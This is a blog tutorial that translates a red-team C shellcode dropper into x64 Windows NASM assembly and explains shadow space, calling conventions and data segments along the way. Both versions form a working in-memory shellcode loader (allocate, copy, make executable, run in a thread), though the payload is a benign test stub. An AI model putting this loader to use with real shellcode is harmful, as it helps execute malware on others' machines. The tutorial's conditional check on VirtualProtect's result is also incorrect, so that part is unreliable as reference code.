Summary: Practical lessons from converting a C malware dropper to x64 Windows assembly, covering shadow spaces, calling conventions, and memory segments.

In this post I'll be listing down lessons I learned while converting a simple malware dropper written in C to x64 assembly. 

I started this project as a way to deepen my understanding of assembly so I could be better in malware development and reverse engineering (And also because I love coding in assembly and would always find an excuse to use it).

## What to expect

I'll be going through sections of the C file and show the how it can be written accordingly in x64 Windows assembly. Take note, however, that the conversion is not one-to-one, meaning there are other ways of writing it. What I did was to structure the assembly code so that you can easily compare it with the C code while making sure that the end result will be the same.

I won't be covering the basics of assembly because [this post](https://sonictk.github.io/asm_tutorial/) does a better job of doing that. And as for the assembler, I'll be using [nasm](https://www.nasm.us/) because this is the one I'm most familiar with.

> **Disclaimer:** I am not an expert in any of these topics. I'm just someone who learned things and wish to share it to others. If I'm wrong about anything feel free to point it out. 

## Credits

The malware dropper that we'll be converting is made by [@reenz0h](https://twitter.com/sektor7net). I found it in [kymb0's repository](https://github.com/kymb0/Malware_learns) and I learned that it's a part of the [Red Team Operator course by Sektor7](https://institute.sektor7.net/). I've read good things about the course and I plan to take it in the future, you should check it out too.

## The dropper

Here's the malware dropper that we'll be converting:

```c
/*

 Red Team Operator course code template
 storing payload in .data section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 4 byte payload
unsigned char payload[] = {
	0x90,		// NOP
	0x90,		// NOP
	0xcc,		// INT3
	0xc3		// RET
};
unsigned int payload_len = 4;

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// Allocate a memory buffer for payload.
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

Here is what the code does:

* Allocates memory buffer with size `payload_len`
* Copies `payload` to the buffer
* The buffer's memory protection is changed to `PAGE_EXECUTE_READ` which allows for code execution
* A thread is created that runs the payload, which runs indefinitely

It doesn't seem that the program is doing much when run. All we see are the payload and exec_mem addresses for debugging purposes and nothing much else.

The most interesting parts with this code will be seen under a debugger, which I'll go through later in this post.

## Including external functions

In C, if we want to to use a Windows API function, we need to include the necessary header files and make sure to supply required library names via the linker, like so:

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
```

x64 assembly does not use header files so the process is done differently. First, the necessary ".lib" files should be supplied to the linker:

```bash
link dropper_data.obj /subsystem:console /out:dropper_data.exe kernel32.lib msvcrt.lib

```

Next, every external function that we'll be using in our code needs to be specified as shown below:

```asm
segment .text
	global main
	extern ExitProcess
	extern printf
	extern VirtualAlloc
	extern VirtualProtect
	extern RtlMoveMemory
	extern getchar
	extern CreateThread
	extern WaitForSingleObject
```

Note that the `extern` keyword in assembly is different in C. Externs in C are used for *exporting* symbols while they are used for *importing* symbols in Assembly. `global` is the one used for exporting.

Once the symbols are properly exported then that is when the functions can be used with the `call` operand.

## The entrypoint

There needs to be an entry point so that the operating system knows where to jump to start our program. We do this in C by declaring a `main` function:

```c
int main(void) {
	...
}
```

In assembly, we declare the entry point with `global main` (As seen in the previous section) and also supply the `main:` label within the code. This is where execution will jump to.

```asm
segment .text
   global main
   ...
   ...

main:
   push    rbp
   ...
   ...
```

## The payload

The payload in this example is a simple shellcode made for testing purposes. This can be changed to any shellcode of any length as long as `payload_len` reflects the new size of the shellcode.

```c
// 4 byte payload
unsigned char payload[] = {
	0x90,		// NOP
	0x90,		// NOP
	0xcc,		// INT3
	0xc3		// RET
};
unsigned int payload_len = 4;
```

In assembly, initializing data is done in `segment .data`.

```asm
segment .data
	...
	...
	;; 4 byte payload
	payload     	db	0x90, 0x90, 0xCC, 0xC3
	payload_len 	db	4
```

We can then check the above data laid out in the `.data` memory segment using a debugger:

![converting-a-malware-dropper-to-x64-assembly-02]({attach}/images/converting-a-malware-dropper-to-x64-assembly-02.png)

![converting-a-malware-dropper-to-x64-assembly-03]({attach}/images/converting-a-malware-dropper-to-x64-assembly-03.png)

You may notice that our shellcode is not at the start of the `.data` segment because there are other data that was declared prior to our payload. This is important to note as the order we declare the data will be the order they will appear in memory.

## Initialized data

All data in assembly needs to be declared and initialized before it can be used:

```asm
segment .data
	msg_hello 	    db 	"Hello world!", 0xd, 0xa, 0
	msg_exec_addr	db 	"exec_mem addr", 0
	msg_pload_addr	db 	"payload addr", 0	
	msg_format	    db	"%-20s : 0x%-016p", 0xd, 0xa, 0
	msg_hit_me	    db 	"Hit me!", 0xd, 0xa, 0

	...
	...
	lea rcx, [msg_format]
	lea	rdx, [msg_pload_addr]
	...
	call    printf
	...
```

This is optional in C as you can pass data (like a string) directly to a function without adding it to a variable:

```c
printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
```

However, under the hood, the C compiler actually places these data on the `.data` segment for you automatically. If you were to compile and run the C program you would see that the strings are in the `.data` segment.

## Uninitialized data

Memory of certain sizes can be reserved so that it can be used later in a program. These unitialized data is declared not in a `.data` segment but in a `.bss` segment [(more here)](https://en.wikipedia.org/wiki/.bss).

```asm
segment .bss	
	exec_mem	resb	8
	old_protect	resb	8
```

Nasm provides specific "pseudo-instructions" for declaring unitialized data like `resb` (reserve byte), `resw` (reserve word), and so on. 

Alternatively, this can be written like this:

```asm
segment .bss	
	exec_mem        db	8 dup (?)   ; Reserve 8 bytes of ? null value
	old_protect	    dq	1 	        ; DQ = QWORD
```

It would still work but NASM doesn't like it and would throw a warning.

```bash
dropper_data.asm:18: warning: attempt to initialize memory in BSS section `.bss': ignored [-w+other]
```

The memory for the uninitialized data won't be reserved until the program is loaded. Once it is, we can see the reserved memory in the `.data` segment. 

Any data we move to the previously unitialized data can now be seen from a debugger. See below for an example:

```asm
	mov	[exec_mem], rax  ; Move "000001F96E100000" to memory
```

## Shadow Spaces

When calling a function in x64 Windows assembly, programmers must keep in mind to reserve a "shadow space" before doing a `call` to an external function that is in another language like C or C++. For example:

```
	sub     rsp, 32	
 	call	getchar
	add     rsp, 32
```	

But what is a shadow space? [Here](https://stackoverflow.com/questions/30190132/what-is-the-shadow-space-in-x64-assembly) is a quick explanation:

> The shadow space is the mandatory 32 bytes (4x8 bytes) you must reserve for the called procedure. It just means you must provide 32 bytes on the stack before calling.

> It can be used by compilers to leave a copy of the register values on the stack for later inspection in the debugger. It is meant to be used to make debugging x64 easier.

So in the code above, `sub rsp, 32` reserves the shadow space before `getchar` is called. The space on the stack is highlighted in the image below.

![converting-a-malware-dropper-to-x64-assembly-05]({attach}/images/converting-a-malware-dropper-to-x64-assembly-05.png)

`call getchar` then executes and the "shadow space" gets filled.

![converting-a-malware-dropper-to-x64-assembly-06]({attach}/images/converting-a-malware-dropper-to-x64-assembly-06.png)

As the caller, we really do not care about the data that gets placed in the shadows space. So after calling the functions we do `add rsp, 32` to reclaim the shadow space.

You'll find out the importance of properly reserving and releasing a shadow space especially if you are relying on the stack for saving local variables. Here is a segment of the code where I found out first-hand the importance of handling the shadow space.

```asm
	push	rax                ;; I need rax for later so I pushed it on the stack

	lea     rcx, [msg_hit_me]
	call    printf             ;; printf was expecting a shadow space so it just wrote onto the stack, overwriting the value from RAX before

 	call	getchar            ;; getchar did the same too

	pop	rax                    ;; The value saved by rax is overwritten
```

Simply handling the shadow space avoided this problem:

```asm
	push	rax

	lea     rcx, [msg_hit_me]
	sub     rsp, 32			   ;; shadow space is reserved
	call    printf             ;; printf can write to the stack without overwriting data that I need
	add     rsp, 32	           ;; shadow space is released

	sub     rsp, 32			   ;; shadow space is reserved
 	call	getchar            ;; same goes with getchar
	add     rsp, 32            ;; shadow space is released

	pop	rax                    ;; I got the correct value from rax that I pushed
```

The above code can be further optimized by only releasing the shadow space after both call to `printf` and `getchar`, as shown below:

```asm
	push	rax

	lea     rcx, [msg_hit_me]
	sub     rsp, 32			   ;; shadow space is reserved
	call    printf             ;; printf can write to the stack without overwriting data that I need

	call	getchar            ;; same goes with getchar
	add     rsp, 32            ;; shadow space is released

	pop	rax                    ;; I got the correct value from rax that I pushed
```

However, there might come a time when the code will change and you might forget to re-add the code that releases and reserves the shadow space. This may lead to hard-to-find stack related problems. To avoid this, just make it a habit to reserve and release the shadow space every time an external function is called.

As an alternative, you can use a routine that could reserve and release the shadow space automatically like the one below:

```asm
shadow_call:
	pop rbx		    ; Get the return address pointer in a non-volitile register
	sub rsp, 20h	; Add the shadow space
	call rax	    ; Call the function
	add rsp, 20h	; Remove the shadow space
	jmp rbx		    ; Go back to the stored instruction address
	ret
```

To call the routine, just do this:

```asm
	mov	rax, getchar
	call	shadow_call
```

But honestly, I think it's less complicated to just do the handling of shadow space yourself.

Shadow spaces threw me off a bit when I was researching about this, but everything I said above should be enough of an explanation. If however you want more then go [here](https://retroscience.net/x64-assembly.html) and then [here](https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735).

## Microsoft x64 Calling Convention

It is also important to note that the calling convention for functions is different for Windows compared to other operating systems.

As a quick reference, if you are going to pass parameters to a function you need to use registers `rcx`, `rdx`, `r8`, and `r9` for the first, second, third, and fourth parameters respectively.

Here's an example from our code:

```c
	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
```

In assembly, we supply the parameters like so:

```asm
	;; Make new buffer as executable
	mov	rcx, [exec_mem]      ;; First parameter
	xor	rdx, rdx
	mov	dl, [payload_len]    ;; Second parameter
	mov	r8, 0x20             ;; Third parameter
	xor	r9, r9
	lea	r9, [old_protect]    ;; Fourth parameter
	sub     rsp, 32		     ;; Reserve shadow space
	call	VirtualProtect   ;; Call function
	add     rsp, 32          ;; Release shadow space

```

For functions that require more than four parameters, the stack needs to be utilized. This can get confusing so let me point you to [this post](https://sonictk.github.io/asm_tutorial/#windows:thewindowtothehardware/themicrosoftx64callingconvention) as it has diagrams for visualization.

## The final code

The rest of the code can be converted using the concepts I've described above. Here is the fully converted code:

```asm
	bits 64
	default rel

segment .data
	msg_hello 	db 	"Hello world!", 0xd, 0xa, 0
	msg_exec_addr	db 	"exec_mem addr", 0
	msg_pload_addr	db 	"payload addr", 0	
	msg_format	db	"%-20s : 0x%-016p", 0xd, 0xa, 0
	msg_hit_me	db 	"Hit me!", 0xd, 0xa, 0

	;; 4 byte payload
	payload 	db	0x90, 0x90, 0xCC, 0xC3
	payload_len 	db	4

segment .bss	
	exec_mem	resb	8
	old_protect	resb	8	

segment .text
	global main
	extern ExitProcess
	extern printf
	extern VirtualAlloc
	extern VirtualProtect
	extern RtlMoveMemory
	extern getchar
	extern CreateThread
	extern WaitForSingleObject

main:
	push    rbp
	mov     rbp, rsp

 	;; Allocate a memory buffer for payload.
	mov	rcx, 0
	xor	rdx, rdx
	mov	dl, [payload_len]
	mov	r8, 0x3000
	mov	r9, 0x4
	sub     rsp, 32	
 	call	VirtualAlloc
	add     rsp, 32	

	mov	[exec_mem], rax

	lea     rcx, [msg_format]
	lea	rdx, [msg_pload_addr]
	lea	r8, payload
	sub     rsp, 32	
	call    printf
	add     rsp, 32	

	lea     rcx, [msg_format]
	lea	rdx, [msg_exec_addr]
	mov	r8, [exec_mem]
	sub     rsp, 32
	
	call    printf
	add     rsp, 32	

	;; Copy payload to new buffer
	mov	rcx, [exec_mem]
	lea	rdx, [payload]
	xor	r8, r8
	mov	r8b, [payload_len]
	sub     rsp, 32		
	call	RtlMoveMemory
	add     rsp, 32	

	;; Make new buffer as executable
	mov	rcx, [exec_mem]
	xor	rdx, rdx
	mov	dl, [payload_len]
		mov	r8, 0x20
	xor	r9, r9
	lea	r9, [old_protect]
	sub     rsp, 32		
	call	VirtualProtect
	add     rsp, 32

	push	rax

	lea     rcx, [msg_hit_me]
	sub     rsp, 32			
	call    printf
	add     rsp, 32	

	sub     rsp, 32				
	call	getchar
	add     rsp, 32

	pop	rax

	;; If all good, run the payload	
	jz	ifrvzero

	xor	rcx, rcx
	xor	rdx, rdx
	mov	r8, [exec_mem]
	xor	r9, r9
	push	r9
	push	r9
	call	CreateThread

	mov	rcx, rax
	mov	rdx, 0xFFFFFFFF
	call	WaitForSingleObject
		
ifrvzero:

	xor     rax, rax
	call    ExitProcess
```

As mentioned before, I did my best to match the structure of the C code to the assembly code to make it easy to compare how one section was translated to the other. There are other parts like the `jz ifrvzero` conditonal jump that I didn't discuss, but those can be easily be understood if you know the basics in assembly.

I've also uploaded the code on it's own repository [here](https://github.com/accidentalrebel/malware-dropper-x64-win-assembly). Updates and fixes to the code will be pushed there.

-------------------------------------------------------------------------------

A lot of the concepts I've described in this post were the lessons I learned while working on this project. Most of these can be researched but I'm hoping that collecting them in one location would benefit the next bloke who is crazy like me to do the same.

Feel free to reach out to me on [Twitter](https://twitter.com/accidentalrebel) or [LinkedIn](https://www.linkedin.com/in/juan-karlo-licudine/) for any questions or comments.

These x64 assembly skills are put to use in [Sandbox Evasion by Checking RAM Size]({filename}/malware-sandbox-evasion-in-x64-assembly-by-checking-ram-size-part-1.md), where I apply the same calling conventions to implement a real evasion technique.

Also related: [String AV Evasion in x64 Assembly]({filename}/string-av-evasion-in-x64-assembly-part-1.md), which uses the stack techniques covered here to hide strings from antivirus scanners.
